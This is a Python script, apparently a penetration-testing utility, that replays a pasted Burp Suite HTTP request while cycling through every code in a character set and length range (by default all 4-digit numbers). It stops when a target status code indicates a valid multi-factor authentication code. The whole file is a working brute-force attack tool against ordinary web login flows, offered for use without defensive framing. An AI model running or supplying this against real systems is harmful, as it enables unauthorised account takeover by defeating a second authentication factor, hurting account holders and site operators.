import requests
import itertools
import string
import sys

def get_input(prompt, default=None):
    """Helper function to get user input with an optional default."""
    value = input(f"{prompt} (default: {default}): ") or default
    return value

def parse_burp_request(raw_request):
    """Parse the raw Burp request into URL, headers, and POST data."""
    lines = raw_request.splitlines()
    url = ""
    headers = {}
    data = ""
    scheme = "https"  # Default scheme

    # Parse the request line
    request_line = lines[0].split()
    if len(request_line) < 2:
        raise ValueError("Invalid request line")
    
    # Extract the path from the request line
    path = request_line[1]
    
    # Parse headers until an empty line is encountered
    header_done = False
    for line in lines[1:]:
        if line == "":
            header_done = True
            continue
        if not header_done:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
            if key.strip().lower() == "host":
                host = value.strip()
            if key.strip().lower() == "origin":
                scheme = value.strip().split(":")[0]  # Get scheme from the Origin header
        else:
            # Remaining part after the empty line is the data
            data += line + "\n"

    # Strip any trailing newline from the data
    data = data.strip()

    # Construct the full URL
    url = f"{scheme}://{host}{path}"
    
    return url, headers, data

def generate_payloads(charset, min_length, max_length):
    """Generate payloads using the specified character set and length range."""
    for length in range(min_length, max_length + 1):
        for payload in itertools.product(charset, repeat=length):
            yield ''.join(payload)

def brute_force_mfa(burp_request, brute_force_position, charset, min_length, max_length, target_status_code):
    """Perform the brute-force attack using the provided configuration."""
    # Parse the Burp request
    url, headers, data_template = parse_burp_request(burp_request)
    
    # Generate all possible payloads
    total_attempts = sum(len(charset) ** length for length in range(min_length, max_length + 1))
    payload_generator = generate_payloads(charset, min_length, max_length)
    
    # Start brute-forcing
    for attempt_number, payload in enumerate(payload_generator, start=1):
        # Replace the placeholder with the actual brute-force payload in the request
        data = data_template.replace(brute_force_position, payload)
        
        # Send the HTTP POST request
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        # Update the progress in the same line
        sys.stdout.write(f"\rAttempt {attempt_number}/{total_attempts} - Trying Payload: {payload} - Status Code: {response.status_code}")
        sys.stdout.flush()
        
        # Check for the target status code
        if response.status_code == target_status_code:
            print(f"\nSuccess! Payload '{payload}' resulted in a {target_status_code} status code.")
            print(f"Response: {response.text}")
            break
    else:
        print("\nBrute-force attack completed without finding a valid payload.")

if __name__ == "__main__":
    # Get user input for the Burp request details
    print("Please provide the raw Burp request (paste it here):")
    raw_burp_request = ""
    while True:
        line = input()
        if line == "":
            break
        raw_burp_request += line + "\n"
    
    # Get the brute-force target position and charset
    brute_force_position = get_input("Where to insert the brute-force payload in the request", "{payload}")
    charset = get_input("Character set for brute-forcing", string.digits)
    min_length = int(get_input("Minimum length of payload", "4"))
    max_length = int(get_input("Maximum length of payload", "4"))
    target_status_code = int(get_input("Target status code to look for", "302"))
    
    # Run the brute-force script
    brute_force_mfa(raw_burp_request, brute_force_position, charset, min_length, max_length, target_status_code)
